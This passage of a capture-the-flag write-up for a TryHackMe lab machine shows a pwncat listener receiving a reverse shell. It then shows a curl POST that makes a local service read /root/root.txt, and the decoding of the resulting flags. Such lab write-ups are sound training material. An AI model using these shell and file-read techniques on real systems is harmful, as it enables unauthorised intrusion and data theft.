+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>$ pwncat -l 9999 -vv
+</span></span><span class=line><span class=cl>INFO: Listening on :::9999 (family 10/IPv6, TCP)
+</span></span><span class=line><span class=cl>INFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP)
+</span></span><span class=line><span class=cl>INFO: Client connected from 10.10.2.188:33672 (family 2/IPv4, TCP)
+</span></span><span class=line><span class=cl>sh: cannot set terminal process group (978): Inappropriate ioctl for device
+</span></span><span class=line><span class=cl>sh: no job control in this shell
+</span></span><span class=line><span class=cl>sh-4.4$ id
+</span></span><span class=line><span class=cl>uid=1000(magician) gid=1000(magician) groups=1000(magician)
+</span></span><span class=line><span class=cl>sh-4.4$ pwd
+</span></span><span class=line><span class=cl>/tmp/hsperfdata_magician
+</span></span><span class=line><span class=cl>sh-4.4$ ls /home
+</span></span><span class=line><span class=cl>magician
+</span></span><span class=line><span class=cl>sh-4.4$ cd
+</span></span><span class=line><span class=cl>sh-4.4$ pwd
+</span></span><span class=line><span class=cl>/home/magician
+</span></span><span class=line><span class=cl>sh-4.4$ cat user.txt
+</span></span><span class=line><span class=cl>THM{edited}
+</span></span></code></pre></td></tr></table></div></div><p>user flag: {% spoiler <code>THM{simsalabim_hex_hex}</code> %}</p><h2 id=elevation-of-privilege-eop-from-magician-to-root>Elevation of privilege (EoP): from magician to root<a hidden class=anchor aria-hidden=true href=#elevation-of-privilege-eop-from-magician-to-root>#</a></h2><p>A hint was left to us:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>sh-4.4$ cat the_magic_continues
+</span></span><span class=line><span class=cl>The magician is known to keep a locally listening cat up his sleeve, it is said to be an oracle who will tell you secrets if you are good enough to understand its meows.
+</span></span></code></pre></td></tr></table></div></div><p>There must be a local service.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>sh-4.4$ ss -nlpt
+</span></span><span class=line><span class=cl>State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port
+</span></span><span class=line><span class=cl>LISTEN   0         128                 0.0.0.0:8081             0.0.0.0:*
+</span></span><span class=line><span class=cl>LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*
+</span></span><span class=line><span class=cl>LISTEN   0         128               127.0.0.1:6666             0.0.0.0:*
+</span></span><span class=line><span class=cl>LISTEN   0         100                       *:8080                   *:*        users:((&#34;java&#34;,pid=915,fd=25))
+</span></span><span class=line><span class=cl>LISTEN   0         32                        *:21                     *:*
+</span></span></code></pre></td></tr></table></div></div><p>There something on port 6666.</p><p>Let&rsquo;s see if it&rsquo;s a web app:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>sh-4.4$ curl http://127.0.0.1:6666
+</span></span><span class=line><span class=cl>...
+</span></span><span class=line><span class=cl>&lt;form action=&#34;&#34; method=&#34;post&#34; class=&#34;form&#34; role=&#34;form&#34;&gt;
+</span></span><span class=line><span class=cl>    &lt;div class=&#34;form-group &#34;&gt;
+</span></span><span class=line><span class=cl>        &lt;label class=&#34;control-label&#34; for=&#34;filename&#34;&gt;Enter filename&lt;/label&gt;
+</span></span><span class=line><span class=cl>        &lt;input class=&#34;form-control&#34; id=&#34;filename&#34; name=&#34;filename&#34; type=&#34;text&#34; value=&#34;&#34;&gt;
+</span></span><span class=line><span class=cl>    &lt;/div&gt;
+</span></span><span class=line><span class=cl>    &lt;input class=&#34;btn btn-default&#34; id=&#34;submit&#34; name=&#34;submit&#34; type=&#34;submit&#34; value=&#34;Submit&#34;&gt;
+</span></span><span class=line><span class=cl>&lt;/form&gt;
+</span></span><span class=line><span class=cl>...
+</span></span></code></pre></td></tr></table></div></div><p>We could use some [pivoting techniques][2] but that won&rsquo;t be necessary here as
+the case is very simple.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>sh-4.4$ curl http://127.0.0.1:6666 -s -X POST --data &#39;filename=/root/root.txt&#39;
+</span></span><span class=line><span class=cl>...
+</span></span><span class=line><span class=cl>&lt;pre class=&#34;page-header&#34;&gt;
+</span></span><span class=line><span class=cl>1010100 1001000 1001101 1111011 1101101 1100001 1100111 1101001 1100011 1011111 1101101 1100001 1111001 1011111 1101101 1100001 1101011 1100101 1011111 1101101 1100001 1101110 1111001 1011111 1101101 1100101 1101110 1011111 1101101 1100001 1100100 1111101 1010
+</span></span><span class=line><span class=cl>&lt;/pre&gt;
+</span></span><span class=line><span class=cl>...
+</span></span></code></pre></td></tr></table></div></div><p>Decoding the binary gave nothing, I tried a second type and got a flag
+encoded with caesar cipher: <code>GUZ{zntvp_znl_znxr_znal_zra_znq}</code>.</p><p>I decoded it with [ctf-party][3].</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=n>ctf_party_console</span>
+</span></span><span class=line><span class=cl><span class=n>irb</span><span class=p>(</span><span class=n>main</span><span class=p>):</span><span class=mo>001</span><span class=p>:</span><span class=mi>0</span><span class=o>&gt;</span> <span class=s1>&#39;GUZ{zntvp_znl_znxr_znal_zra_znq}&#39;</span><span class=o>.</span><span class=n>rot13</span>
+</span></span><span class=line><span class=cl><span class=o>=&gt;</span> <span class=s2>&#34;THM{edited}&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p>root flag: {% spoiler <code>THM{magic_may_make_many_men_mad}</code> %}</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/tryhackme/>Tryhackme</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2026 <a href=https://s4ch.github.io/>CyFun</a></span>
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>
